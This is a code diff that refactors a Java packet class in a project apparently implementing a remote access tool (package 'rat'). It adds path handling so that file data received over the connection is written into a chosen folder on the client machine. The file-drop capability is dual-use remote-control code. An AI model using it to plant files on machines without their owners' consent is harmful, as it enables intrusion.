@@ -8,10 +8,10 @@ import de.sogomn.rat.ActiveClient;
 public final class UploadFilePacket implements IPacket {
 	
 	private byte[] data;
-	private String folder, fileName;
+	private String folderPath, fileName;
 	
-	public UploadFilePacket(final String filePath, final String folder) {
-		this.folder = folder;
+	public UploadFilePacket(final String filePath, final String folderPath) {
+		this.folderPath = folderPath;
 		
 		final File file = new File(filePath);
 		
@@ -19,15 +19,19 @@ public final class UploadFilePacket implements IPacket {
 		fileName = file.getName();
 	}
 	
+	public UploadFilePacket(final File file, final String folderPath) {
+		this(file.getAbsolutePath(), folderPath);
+	}
+	
 	public UploadFilePacket() {
-		folder = fileName = "";
+		folderPath = fileName = "";
 	}
 	
 	@Override
 	public void send(final ActiveClient client) {
 		client.writeInt(data.length);
 		client.write(data);
-		client.writeUTF(folder);
+		client.writeUTF(folderPath);
 		client.writeUTF(fileName);
 	}
 	
@@ -39,15 +43,29 @@ public final class UploadFilePacket implements IPacket {
 		
 		client.read(data);
 		
-		folder = client.readUTF();
+		folderPath = client.readUTF();
 		fileName = client.readUTF();
 	}
 	
 	@Override
 	public void execute(final ActiveClient client) {
-		final String path = folder + fileName;
+		final File folder = new File(folderPath);
 		
-		FileUtils.writeData(path, data);
+		String path = null;
+		
+		if (folder.isDirectory()) {
+			path = folderPath + File.separator + fileName;
+		} else {
+			final File parent = folder.getParentFile();
+			
+			if (parent != null) {
+				path = parent.getAbsolutePath() + File.separator + fileName;
+			}
+		}
+		
+		if (path != null) {
+			FileUtils.writeData(path, data);
+		}
 	}
 	
 }
